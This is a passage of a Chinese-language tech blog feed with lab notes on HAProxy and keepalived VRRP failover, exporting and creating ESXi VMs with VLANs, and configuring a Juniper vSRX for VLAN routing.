                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#haproxy&quot;&gt;#haproxy&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#vrrp&quot;&gt;#vrrp&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#linux&quot;&gt;#linux&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#keepalived&quot;&gt;#keepalived&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#proxy&quot;&gt;#proxy&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;vrrp-virtual-router-redundancy-protocol&quot; tabindex=&quot;-1&quot;&gt;VRRP(Virtual Router Redundancy Protocol)&lt;/h1&gt;
&lt;p&gt;主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。&lt;br /&gt;
兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server&lt;/p&gt;
&lt;h2 id=&quot;架構圖&quot; tabindex=&quot;-1&quot;&gt;架構圖&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122113609.png&quot; alt=&quot;Pasted image 20241122113609.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;參考教學 : &lt;a href=&quot;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;安裝&quot; tabindex=&quot;-1&quot;&gt;安裝&lt;/h2&gt;
&lt;h3 id=&quot;haproxy&quot; tabindex=&quot;-1&quot;&gt;haproxy&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt install haproxy
$ haproxy -v
HA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;keepalived&quot; tabindex=&quot;-1&quot;&gt;keepalived&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ apt-get install keepalived
$ systemctl status keepalived
● keepalived.service - Keepalive Daemon (LVS and VRRP)
     Loaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)
     Active: inactive (dead)
  Condition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago

Nov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出現 inactive 是正常的，因為沒有 keepalived 的設定檔&lt;/p&gt;
&lt;p&gt;所以要從 keepalived config sample 裡面拿到範例設定檔&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;vrrp&quot; tabindex=&quot;-1&quot;&gt;VRRP 主備切換環境&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122103718.png&quot; alt=&quot;Pasted image 20241122103718.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;設定檔&quot; tabindex=&quot;-1&quot;&gt;設定檔&lt;/h2&gt;
&lt;p&gt;jason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放&lt;/p&gt;
&lt;h3 id=&quot;jason-1-master&quot; tabindex=&quot;-1&quot;&gt;jason-1(Master)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http

frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    balance roundrobin
    server test-2 10.xx.x.154:8080 check &amp;lt;-- 這個要指定後端 server 位置
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}

vrrp_instance VI_1 {
    state MASTER # 路由器的首選狀態 - MASTER 或 BACKUP
    interface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分
    unicast_src_ip 10.xx.x.153 # 目前路由器的IP位址
    unicast_peer{ 
        10.xx.x.154 # VRRP中其他路由器的IP位址
    } 
    virtual_router_id 50
    # nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。
    priority 101 # 優先權：該路由器在其他路由器中的優先權
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;jason-2-backup&quot; tabindex=&quot;-1&quot;&gt;jason-2(Backup)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http
frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    server test-2 172.xx.x.1:8080 check
    # option httpchk
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}
vrrp_instance VI_1 {
    interface ens160
    state BACKUP
    unicast_src_ip 10.xx.x.154
    unicast_peer{ 
        10.xx.x.153
    } 
    virtual_router_id 50
    # nopreempt
    priority 101
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP] Tip: nopreempt&lt;br /&gt;
允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。&lt;br /&gt;
發生情境:&lt;br /&gt;
其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;執行&quot; tabindex=&quot;-1&quot;&gt;執行&lt;/h2&gt;
&lt;p&gt;jason-1(Master)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2(Backup)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2 這台目前是 BACKUP mode&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121162744.png&quot; alt=&quot;Pasted image 20241121162744.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;實驗&quot; tabindex=&quot;-1&quot;&gt;實驗&lt;/h2&gt;
&lt;p&gt;目前狀態&lt;/p&gt;
&lt;p&gt;jason-1 - Master&lt;br /&gt;
jason-2 - Backup&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121163855.png&quot; alt=&quot;Pasted image 20241121163855.png&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;jason-3&quot; tabindex=&quot;-1&quot;&gt;jason-3 觀測機&lt;/h4&gt;
&lt;p&gt;arp table 測試&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo arping 10.xx.x.160
60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;現在 &lt;code&gt;10.xx.x.160&lt;/code&gt; 是 jason-1(00:xx:xx:xx:88) 所負責的&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122105210.png&quot; alt=&quot;Pasted image 20241122105210.png&quot; /&gt;&lt;br /&gt;
查看 arp table&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ arp -a
...
? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;關閉 jason-1(Master)&lt;br /&gt;
sudo systemctl stop keepalived&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104314.png&quot; alt=&quot;Pasted image 20241122104314.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;發現 jason-2(Backup) 主機接手 Master 位置&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217231432.png&quot; alt=&quot;Pasted image 20251217231432.png&quot; /&gt;&lt;br /&gt;
到 jason-3 探測機，發現已經迅速切換主備位置了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104433.png&quot; alt=&quot;Pasted image 20241122104433.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;arp table 也同步更新&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104539.png&quot; alt=&quot;Pasted image 20241122104539.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;服務也未中斷&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104608.png&quot; alt=&quot;Pasted image 20241122104608.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;vrrp-1&quot; tabindex=&quot;-1&quot;&gt;VRRP工作原理&lt;/h2&gt;
&lt;p&gt;ref: &lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;ARP&lt;/a&gt;回應，並定期發送VRRP通告報文。&lt;/p&gt;
&lt;p&gt;VRRP的詳細工作過程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;VRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;免費ARP&lt;/a&gt;報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。&lt;/li&gt;
&lt;li&gt;Master設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。&lt;/li&gt;
&lt;li&gt;如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。&lt;/li&gt;
&lt;li&gt;VRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。&lt;/li&gt;
&lt;li&gt;原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。&lt;/li&gt;
&lt;li&gt;Backup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/" >
        </entry>
        <entry>
            <title>
                從現有的 ESXi 匯出 VM
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/從現有的 ESXi 匯出 VM/</id>
            <content type="html">
                &lt;h2 id=&quot;es-xi-vm&quot; tabindex=&quot;-1&quot;&gt;從現有的 ESXi 匯出 VM&lt;/h2&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li&gt;從原本的 ESXi 匯出&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100447.png&quot; alt=&quot;Pasted image 20251227100447.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;匯出後會有兩個檔案&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100505.png&quot; alt=&quot;Pasted image 20251227100505.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;在另一台 ESXi 建立虛擬機器&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226135901.png&quot; alt=&quot;Pasted image 20251226135901.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;從 OVF 建立&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226140024.png&quot; alt=&quot;Pasted image 20251226140024.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;將 ovf 與 vmdk 上傳&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100548.png&quot; alt=&quot;Pasted image 20251227100548.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;設定儲存區&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226140323.png&quot; alt=&quot;Pasted image 20251226140323.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;調整網路對應與磁碟佈建&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226140359.png&quot; alt=&quot;Pasted image 20251226140359.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;完成&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226140437.png&quot; alt=&quot;Pasted image 20251226140437.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/從現有的 ESXi 匯出 VM/" >
        </entry>
        <entry>
            <title>
                建立虛擬機器並綁定 VLAN
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/建立虛擬機器並綁定 VLAN/</id>
            <content type="html">
                &lt;p&gt;建立虛擬機器&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100826.png&quot; alt=&quot;Pasted image 20251227100826.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;選取建立類型&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100852.png&quot; alt=&quot;Pasted image 20251227100852.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;選取名稱和客體作業系統&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100951.png&quot; alt=&quot;Pasted image 20251227100951.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;選取儲存區&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227101036.png&quot; alt=&quot;Pasted image 20251227101036.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;設定網路介面卡&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227101137.png&quot; alt=&quot;Pasted image 20251227101137.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;下一頁&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227101159.png&quot; alt=&quot;Pasted image 20251227101159.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;完成&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227101228.png&quot; alt=&quot;Pasted image 20251227101228.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/ESXi/建立虛擬機器並綁定 VLAN/" >
        </entry>
        <entry>
            <title>
                在 ESXi 以 vSRX 實作單臂路由
                
            </title>
            <updated>2025-12-29T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/ESXi/在 ESXi 以 vSRX 實作單臂路由/</id>
            <content type="html">
                &lt;h2 id=&quot;vsrx&quot; tabindex=&quot;-1&quot;&gt;建立 vsrx 機器&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;下載與試用 vsrx&lt;br /&gt;
&lt;a href=&quot;https://www.juniper.net/us/en/dm/download-next-gen-vsrx-firewall-trial.html&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://www.juniper.net/us/en/dm/download-next-gen-vsrx-firewall-trial.html&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;啟動並登入 vsrx&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226154318.png&quot; alt=&quot;Pasted image 20251226154318.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;新增連接埠群組 test-1&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226154910.png&quot; alt=&quot;Pasted image 20251226154910.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;新增連接埠群組 test-2&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226155140.png&quot; alt=&quot;Pasted image 20251226155140.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;設定 trunk 讓所有封包都走來這個 port-group&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226160743.png&quot; alt=&quot;Pasted image 20251226160743.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;將 trunk port-group 綁到 vSRX&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226160908.png&quot; alt=&quot;Pasted image 20251226160908.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;vlan-v-srx&quot; tabindex=&quot;-1&quot;&gt;註冊並設定 vlan 到 vSRX&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3 id=&quot;vlan&quot; tabindex=&quot;-1&quot;&gt;新增一個 VLAN&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;新增&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ESXi port-group name: test-1&lt;/li&gt;
&lt;li&gt;VLAN ID: 888&lt;/li&gt;
&lt;li&gt;Subnet：&lt;code&gt;10.10.106.0/24&lt;/code&gt;(自行指定)&lt;/li&gt;
&lt;li&gt;Gateway：&lt;code&gt;10.10.106.254&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;新增&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ESXi port-group name: test-2&lt;/li&gt;
&lt;li&gt;VLAN ID: 123&lt;/li&gt;
&lt;li&gt;Subnet：&lt;code&gt;10.10.107.0/24&lt;/code&gt;  (自行指定)&lt;/li&gt;
&lt;li&gt;Gateway：&lt;code&gt;10.10.107.254&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;網路拓樸圖&quot; tabindex=&quot;-1&quot;&gt;網路拓樸圖&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;pg-trunk-vsrx VLAN ID 4095&lt;br /&gt;
test-1 VLAN ID 888&lt;br /&gt;
test-2 VLAN ID 123&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227095327.png&quot; alt=&quot;Pasted image 20251227095327.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;v-srx&quot; tabindex=&quot;-1&quot;&gt;開始設定 vSRX&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;輸入 root 登入&lt;br /&gt;
並輸入 cli 進入 cli 模式&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226161349.png&quot; alt=&quot;Pasted image 20251226161349.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;檢查目前 interface 狀態&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251226161557.png&quot; alt=&quot;Pasted image 20251226161557.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;指令解釋&quot; tabindex=&quot;-1&quot;&gt;指令解釋&lt;/h2&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code&gt;set interfaces ge-0/0/0 unit 888 vlan-id 888 family inet address 10.10.106.254/24
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;set interfaces&lt;br /&gt;
功能：設定網路介面（interface）。&lt;br /&gt;
簡單說，就是告訴 Juniper「我要修改或新增一個網路介面設定」。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ge-0/0/0&lt;br /&gt;
功能：指定要設定的實體介面。&lt;br /&gt;
ge = Gigabit Ethernet（千兆以太網）&lt;br /&gt;
0/0/0 = Slot / PIC / Port（Juniper 介面的命名方式）&lt;br /&gt;
簡單說，就是選定一塊實體網卡。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;unit 888&lt;br /&gt;
功能：指定子介面（sub-interface）的編號。&lt;br /&gt;
Juniper 允許一個實體介面拆成多個子介面，用於不同 VLAN。&lt;br /&gt;
這裡 unit 888 就是給這個子介面編號為 888。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;vlan-id 888&lt;br /&gt;
功能：指定這個子介面對應的 VLAN ID。&lt;br /&gt;
VLAN 888 的流量會走到這個子介面上。&lt;br /&gt;
換句話說，這個子介面屬於 VLAN 888，這個值對應到的是 ESXi 裡的 port-group 定義的 VLAN ID。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;family inet&lt;br /&gt;
功能：指定 IP 層類型，這裡是 IPv4。&lt;br /&gt;
Juniper 的介面可以同時支援多種協議（例如 IPv4, IPv6, MPLS），用 family 來區分。&lt;br /&gt;
這裡的 family inet 就是 IPv4。&lt;br /&gt;
如果你要用 IPv6，就會寫成 family inet6。&lt;br /&gt;
family = 協議類型&lt;br /&gt;
inet = IPv4&lt;br /&gt;
inet6 = IPv6&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;address 10.10.106.254/24&lt;br /&gt;
功能：設定這個子介面的 IP 位址及子網路遮罩。&lt;br /&gt;
10.10.106.254 = IP&lt;br /&gt;
/24 = 子網路遮罩 255.255.255.0&lt;br /&gt;
這個 IP 就是 VLAN 888 的 Layer 3 閘道（gateway）或 VM 要配發的 IP 網段。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;root&quot; tabindex=&quot;-1&quot;&gt;設定 root 帳戶權限&lt;/h2&gt;
&lt;hr /&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;set system root-authentication plain-text-password
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;vlan-1&quot; tabindex=&quot;-1&quot;&gt;開始設定 VLAN&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;進入設定模式：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# 1. 啟動 Tagging
set interfaces ge-0/0/0 vlan-tagging

# 2. 定義 Subinterfaces (L3)
set interfaces ge-0/0/0 unit 888 vlan-id 888 family inet address 10.10.106.254/24
set interfaces ge-0/0/0 unit 123 vlan-id 123 family inet address 10.10.107.254/24

# 3. 安全區域設定 (允許介面通訊與 Ping 自機)
set security zones security-zone trust interfaces ge-0/0/0.888 host-inbound-traffic system-services ping
set security zones security-zone trust interfaces ge-0/0/0.123 host-inbound-traffic system-services ping

# 4. 預設全開 Policy (Trust to Trust)
set security policies from-zone trust to-zone trust policy allow-all match source-address any destination-address any application any
set security policies from-zone trust to-zone trust policy allow-all then permit

commit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;輸入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;show interfaces ge-0/0/0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;vlan 888 與 vlan 123 已設定完成&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251227100135.png&quot; alt=&quot;Pasted image 20251227100135.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;下一步&quot; tabindex=&quot;-1&quot;&gt;下一步&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;依以下步驟建立兩台 VM，&lt;br /&gt;
&lt;a class=&quot;internal-link&quot; target=&quot;&quot; data-note-icon=&quot;&quot; href=&quot;https://hung-jia-jun.github.io/%E6%8A%80%E8%A1%93%E6%96%87%E4%BB%B6/ESXi/%E5%BB%BA%E7%AB%8B%E8%99%9B%E6%93%AC%E6%A9%9F%E5%99%A8%E4%B8%A6%E7%B6%81%E5%AE%9A%20VLAN/&quot;&gt;建立虛擬機器並綁定 VLAN&lt;/a&gt;&lt;br /&gt;
VM1 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VM name: test-1&lt;/li&gt;
&lt;li&gt;VLAN ID: 888&lt;/li&gt;
&lt;li&gt;Address: &lt;code&gt;10.10.106.1/32&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Subnet：&lt;code&gt;10.10.106.0/24&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Gateway：&lt;code&gt;10.10.106.254&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;VM2 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VM name: test-2&lt;/li&gt;
&lt;li&gt;VLAN ID: 123&lt;/li&gt;
&lt;li&gt;Address: &lt;code&gt;10.10.107.1/32&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Subnet：&lt;code&gt;10.10.107.0/24&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Gateway：&lt;code&gt;10.10.107.254&lt;/code&gt;&lt;/li&gt;
